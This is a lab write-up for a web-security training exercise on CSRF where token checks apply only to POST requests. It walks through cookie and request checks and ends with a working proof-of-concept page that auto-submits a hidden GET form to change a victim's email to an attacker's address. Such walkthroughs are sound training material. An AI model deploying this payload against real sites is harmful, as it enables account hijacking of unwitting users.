<h1>CSRF where token validation depends on request method</h1>

Scenario: I am testing the data integrity of a website located at 0a15000904ab0c0a808330ff00b20058.web-security-academy[.]net. I want to know if any
sensitive authenticated actions on the website are vulnerable to Cross Site Request Forgery (CSRF). Let's follow the checks below to find a CSRF 
vulnerability.

1. Check the SameSite attribute of the session cookie(s).
   ![image](https://github.com/user-attachments/assets/15f4d050-80bb-453b-9006-baea2a63699a)

   As you can see, upon logging into the target website, my session cookie has the SameSite attribute set to 'None'. This means my session cookie
   can be used in cross-site requests.

2. Are there any authenticated actions that are not protected with CSRF tokens? Analyze the next 3 images showing the process of changing a user's email
   address on 0a15000904ab0c0a808330ff00b20058.web-security-academy[.]net.
   ![image](https://github.com/user-attachments/assets/a983ae9c-bd9a-44d1-8a8c-3041d92aa2f7)
   ![image](https://github.com/user-attachments/assets/1ba450ce-194a-45db-822f-832937e94474)
   ![image](https://github.com/user-attachments/assets/8c506ddb-a1a1-4aa7-890c-a64e3c5a0567)

   Notice that when sending an HTTP POST request to update the user's email address, a valid CSRF is required in order for the request to be accepted by
   the server. Let's instead send a GET request without any CSRF tokens and see if the user's email address is updated. Analyze the 2 images below.
   ![image](https://github.com/user-attachments/assets/40bd66d0-3415-4745-96d8-d7b8f79bb99f)
   ![image](https://github.com/user-attachments/assets/bd92a962-3c91-44ee-9905-f4b7dbc5b88e)

   Notice that when the user sends an HTTP GET request without any CSRF tokens present in the request, the user's email address is still updated. This
   means that the GET request to update a user's email address is vulnerable to CSRF.

<h1>Proof Of Concept</h1>
To make a user change their email address on 0a15000904ab0c0a808330ff00b20058.web-security-academy[.]net, an attacker can host the following file on 
their malicious domain. When the victim user visits the attacker's domain, their 0a15000904ab0c0a808330ff00b20058.web-security-academy[.]net email address
will be changed.

```
<!DOCTYPE html>
<html>
<body>
      <form action="https://0a15000904ab0c0a808330ff00b20058.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="email" value="yougotpwned@evil-user.net">
      </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
``` 
   

